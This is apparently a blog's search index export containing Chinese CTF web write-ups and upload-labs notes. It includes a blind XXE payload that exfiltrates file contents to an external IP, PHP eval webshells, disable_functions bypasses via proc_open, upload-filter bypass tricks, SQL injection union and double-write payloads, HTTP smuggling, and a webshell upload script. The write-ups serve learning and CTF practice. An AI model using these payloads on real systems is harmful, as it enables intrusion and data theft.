<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NJUPT CTF 2019 web部分writeup</title>
    <url>/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/</url>
    <content><![CDATA[<p>题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><a id="more"></a>


<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>因为题目提示了flag is in /flag，所以构造请求的xml内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span> &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=../../../flag"</span>&gt; &lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.103.62.94:8080/evil.xml"</span>&gt; %dtd; %send; ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;<span class="number">1</span>&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;<span class="number">1</span>&lt;/password&gt;</span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>![1574587789404](NJUPT CTF 2019 web部分writeup/1574587789404.png)</p>
<p>最后把content的内容base64解码即是flag</p>
<p>2.easyphp</p>
<p>是一个函数绕过题，挺好玩的，</p>
<p>1st</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以给num传23333%0a就可以绕过%0a是换行的意思</p>
<p>2nd</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>弱类型比较，当两个字符串以0e开头且全为数字时，==会判断他们相等，返回bool(true)，如</p>
<p>![1574588638162](NJUPT CTF 2019 web部分writeup/1574588638162.png)</p>
<p>所以就有思路啦，需要$string_1是数字，$string_1和$string_2的md5值不等，但把$string_1和$string_2进行md5算法后的值’cxhp’替换为’0123’后，$a==$b，所以我们可以找出数字，md5算法后的值为0e或ce开头，且内容全为数字或’cxhp’，写个脚本跑了一下跑出一个数字，两个字符满足要求，脚本如下，然后让str1=2120624&amp;str2=0yFCJ即可绕过第二步。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0yFCJ	0dmRZ	2120624</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">'0123456789qwertyuiopASDFGHJKLzxcvbnmQWERTYUIOPasdfghjklZXCVBNM'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(key)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(key.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    f=a + b + c + d + e</span><br><span class="line">                    T = md5(f)</span><br><span class="line">                    T = T.replace(<span class="string">'c'</span>, <span class="string">'0'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'x'</span>, <span class="string">'1'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'h'</span>, <span class="string">'2'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'p'</span>, <span class="string">'3'</span>)</span><br><span class="line">                    <span class="keyword">if</span>((T)[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span> <span class="keyword">and</span> (T)[<span class="number">3</span>:].isdigit()):</span><br><span class="line">                        print(f)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">import hashlib</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def md5(key):</span></span><br><span class="line"><span class="string">    m = hashlib.md5()</span></span><br><span class="line"><span class="string">    m.update(key.encode('utf-8'))</span></span><br><span class="line"><span class="string">    return m.hexdigest()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1000000000):</span></span><br><span class="line"><span class="string">    T = md5(str(i))</span></span><br><span class="line"><span class="string">    T = T.replace('c', '0')</span></span><br><span class="line"><span class="string">    T = T.replace('x', '1')</span></span><br><span class="line"><span class="string">    T = T.replace('h', '2')</span></span><br><span class="line"><span class="string">    T = T.replace('p', '3')</span></span><br><span class="line"><span class="string">    if ((T)[0:2] == '0e' and (T)[3:].isdigit()):</span></span><br><span class="line"><span class="string">        print(i)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p>3rd</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是要让请求的字符串中不能含_和%5f(%5f为_的url编码)，但又要对q_w_q传值。。。开始想了很久没有思路，问了大佬，他说_可以用.来代替，没想到这样也可以学到了学到了，所以对q.w.q传值即可，然后简单啦令q.w.q=more *.<em>就可以啦，\</em>是通配符，more以全屏幕的方式按页显示文本文件的内容 </p>
<p>最终完整payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=0yFCJ&amp;q.w.q=more *.*</span></span><br></pre></td></tr></table></figure>



<p>3.Upload your Shell</p>
<p>看源码，发现了这个./index.php?action=imgs.html</p>
<p>点进去看了一下，就是上传点，有文件类型检测，做一个图片马，copy 1.jpg/b+2.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)，然后发现不能有&lt;?，这个之前考过，这样写就可以啦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上传成功后给了个地址，action包含这个地址就可以啦，最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/ed8c5de065c6151959b08babc2521a15/Th1s_is_a_fl4g.jpg</span></span><br></pre></td></tr></table></figure>



<p>4.hacker_backdoor</p>
<p>这个题目也是绕过，waf ban了所有函数和eval，assert，但是可以用字符串拼接绕过，这个题也学到了很多知识，原来eval也可以执行一段代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='php'.'info';%0a$a();&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>

<p>先看一下phpinfo()的disable_function，发现ban了很多函数还包括scandir，readfile，file_get_contents这样的函数（这里没仔细看，其实它放了一个命令执行函数proc_open）后面会发现这个问题，先不说，进行常规步骤，我是找替代scandir，readfile这样的函数，发现了glob函数和highlight_file函数可以使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='var_'.'dump';%0a$b='gl'.'ob';%0a$c='../../../*';%0a$a($b($c));&amp;useful=index.php		//遍历目录</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='highl'.'ight_f'.'ile';%0a$c='../../../readflag';%0a$a($c);&amp;useful=index.php		//读取内容</span></span><br></pre></td></tr></table></figure>

<p>本以为这样读flag就结束了，可是它竟然读不了。。。后来看到了readflag就知道是要用这个读啦，盲猜readflag的内容是cat /flag，所以想办法执行readflag就行了，返回去看disable_functions，ban了那么多函数，以为命令执行函数早被禁完了，但是最终发现没有ban proc_open函数，所以用它执行readflag命令，最终payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>

<p>这里涉及挺多函数的，等过几天把做题经常遇到的函数总结一下。</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-libs通关笔记</title>
    <url>/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><a id="more"></a>
<p><img src="1574137455307.png" alt="1574137455307"></p>
<p>pass-01：前端js代码验证，抓不到包，可禁了js，或者审查元素找到前端函数写的地方把返回值去掉如去掉 onsubmit=”return checkFile()”或修改js加php进去</p>
<p>pass-02：文件类型验证，可以将Content-Type: application/octet-stream改为Content-Type: image/jpeg</p>
<p>pass-03：黑名单验证 asp|.aspx|.php|.jsp，可上传.htaccess 内容”AddType application/x-httpd-php .jpg” 或者 SetHandler application/x-httpd-php，a.php. . (点+空格+点)</p>
<p>pass-04：黑名单验证”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf” 可上传.htaccess 内容”AddType application/x-httpd-php .jpg” 或者 SetHandler application/x-httpd-php，a.php. . (点+空格+点)</p>
<p>pass-05：黑名单验证，后台函数没有将后缀名转换大小写，可以大小写绕过，如a.PHP，a.php. . (点+空格+点)</p>
<p>pass-06：黑名单验证，后台函数没有对后缀名去空处理$file_ext = trim($file_ext);可上传a.php 或直接上传a.php. . (点+空格+点)，windows默认去掉空格，点</p>
<p>pass-07：黑名单验证，后台函数没有对后缀名去点处理$file_name = deldot($file_name);可上传a.php.或直接上传a.php. . (点+空格+点)， windows默认去掉空格，点</p>
<p>pass-08：黑名单验证，后台函数没有对 Windows文件流特性限制$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);，可上传a.php::data</p>
<p>pass-09： a.php. . (点+空格+点)</p>
<p>pass-10：黑名单验证， $file_name = str_ireplace($deny_ext,””, $file_name); 后台函数将$file_name中$deny_ext替换为空，可以双写上传如b.pphphp</p>
<p>pass-11：白名单验证， $img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;上传路径可控可用%00截断，找到save_path在路径后加a.php%00</p>
<p>pass-12：白名单验证，$img_path = $_POST[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;上传路径可控可用%00截断，找到save_path在路径后加a.php%00，注意POST的数据%00要从hex值里面改为00， 因为POST不会像GET对%00进行自动解码</p>
<p>pass-13：copy 1.jpg/b+2.php/a 1.jpg，文件包含解析b表示二进制，a表示ascii码</p>
<p>pass-14：getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过</p>
<p>pass-15：php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过</p>
<p>pass-16：二次渲染，gif上传下载找到没有被渲染的部分，添加代码</p>
<p>pass-17：条件竞争，burpsuite一直发包在上传的php未被删除之前，访问</p>
<p>pass-18：条件竞争，上传图片马burpsuite一直发包在上传的图片马未被删除之前，访问</p>
<p>pass-19：路径可控%00截断</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>Roarctf Web writeup</title>
    <url>/2019/10/28/Roarctf-Web-writeup/</url>
    <content><![CDATA[<p>#写在前面，很多知识都不会，但在慢慢学习过程中积累，下面记录一下Roarctf web 题解，学习一手新知识</p><p>1.easy_calc</p><p>看了一下页面可以计算式子，猜测后台是eval函数，看了下网络看经过哪些请求，发现请求了一个请求网址calc.php?num=1，于是访问calc.php，看到了源码</p><a id="more"></a>


<p><img src="1572272252121.png" alt="1572272252121"></p>
<p>是一个正则匹配，匹配到测试字符则退出，否则eval执行，当时我发现了这个，看了一下，输了phpinfo();发现是403，而之前页面源码告诉了有waf，然后不会做，这里附个链接 <a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">传送门</a> 发现可以利用PHP的字符串解析特性Bypass，所以传参加一个空格即可绕过</p>
<p><img src="1572273442458.png" alt="1572273442458"></p>
<p>看了disable_functions发现该禁的基本上都禁了，之后其实挺简单的，读文件就行，注意之前的正则，这里用ascii编码绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=var_dump(scandir(chr(47)));	//查文件</span></span><br><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));	//读文件</span></span><br></pre></td></tr></table></figure>

<p>看别人的writeup还有一种写法是http走私附个链接 <a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">传送门</a> 大概就是用CL发送一个请求让服务器两次处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /calc.php?num=phpinfo(); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">28890</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=df52311039f2f717d63d154645ddf93431564799805</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Length: 9</span></span><br><span class="line"><span class="comment">Content-Length: 9	//两个C-L，用http走私</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>2.easy_java</p>
<p>这道题打开是一个登录框，考点的java web，点开登录界面的help，发现一个download，可以任意文件下载，利用WEB-INF/web.xml泄露，读取flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p><img src="1572353748785.png" alt="1572353748785"></p>
<p><img src="1572353979564.png" alt="1572353979564"></p>
<p>找到flag文件的关键位置，然后读这个文件，有段base64编码，解码就是flag。</p>
<p>3.Simple Upload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line">useThink\Controller;</span><br><span class="line"></span><br><span class="line">classIndexControllerextendsController</span><br><span class="line">&#123;</span><br><span class="line">   publicfunctionindex()</span><br><span class="line">  &#123;</span><br><span class="line">       show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   publicfunctionupload()</span><br><span class="line">  &#123;</span><br><span class="line">       $uploadFile=$_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">       $upload=<span class="keyword">new</span>\Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">       $upload-&gt;maxSize  =<span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">       $upload-&gt;allowExts  =<span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">       $upload-&gt;rootPath=<span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">       $upload-&gt;savePath=<span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">       $info=$upload-&gt;upload() ;</span><br><span class="line"><span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功获取上传文件信息</span></span><br><span class="line">         $url=__ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">         <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://1a79e33d-c12c-48e5-b33c-48345ac7056f.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"a.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/2019-11-04/%s.php"</span> % hex(j)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> (path)</span><br><span class="line">        <span class="keyword">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> (j, hex(j)[<span class="number">2</span>:<span class="number">-1</span>], r.status_code)</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure>





]]></content>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Syc Geek 10th web部分题解</title>
    <url>/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>1.打比赛先撸一只猫</p><p>查看源码，发现简单考点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>只需GET传参cat=dog即可</p>
<p><img src="1572099090928.png" alt="1572099090928"></p>
<p>2.你看见过我的菜刀么</p>
<p>打开一看页面有一句话，是事先写好的，通过构造参数可以执行任意命令，往往配合菜刀，蚁剑等工具一起使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">"Syc"</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="1572100049777.png" alt="1572100049777"></p>
<p>这里简单读取一下flag文件，也可以使用菜刀，蚁剑连接。</p>
<p>3.BurpSuiiiiiit!!! </p>
<p>下载文件，解压一下是个jar文件，是burpsuite的扩展包，用burpsuite导入一下就能得到flag</p>
<p>4.性感潇文清，在线算卦 </p>
<p>打开题目发现源码中有信息，请求在0.1秒内容会变化，所以使用条件竞争，附一个简单脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geturl</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        r=rq.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Syc'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">data=[<span class="string">'http://148.70.59.198:42534/?u=1&amp;p=1'</span>,<span class="string">'http://148.70.59.198:42534/uploads/b336602455740930585c9e82995cc63b9fa7db8c/356a192b7913b04c54574d18c28d46e6395428ab'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tasks = [gevent.spawn(geturl, url) <span class="keyword">for</span> url <span class="keyword">in</span> data]</span><br><span class="line">    gevent.joinall(tasks)</span><br></pre></td></tr></table></figure>

<p>当然也可以使用burpsuite一直发包请求，然后访问之后提示的页面</p>
<p>5.Easysql</p>
<p>万能密码登录输入用户名’=’ ，密码’=’</p>
<p>6.Lovelysql </p>
<p>简单的注入，这里用联合注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?username=1' order by 3<span class="comment">-- -&amp;password=1	//查字段</span></span><br><span class="line">?username=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">-- -&amp;password=1	//查表名</span></span><br><span class="line">?username=<span class="number">1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="l0ve1ysq1"-- -&amp;password=1	//查列名</span></span><br><span class="line"><span class="string">?username=1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> l0ve1ysq1<span class="comment">-- -&amp;password=1	//查数据</span></span><br></pre></td></tr></table></figure>

<p>7.Babysql </p>
<p>测试一下发现关键字被过滤为空，可以双写绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?username=-1' ununionion selselectect 1,group_concat(passwoorrd),3 frofromm b4bsql<span class="comment">-- -&amp;password=1	//查数据</span></span><br></pre></td></tr></table></figure>

<p>8.李三的代码审计笔记第一页 </p>
<p>代码内容大概就是$password构成了一个数组，GET一个参数url，若没有url里面没有http://则退出，有则请求这个url，返回数据与$password构成的数组比较，相同则下一步，不同退出，按照要求写一个php代码，放在服务器，保存1.php，新建1.txt，内容为0，传参?url=xxx.xxx.xxx.xxx/1.php即可</p>
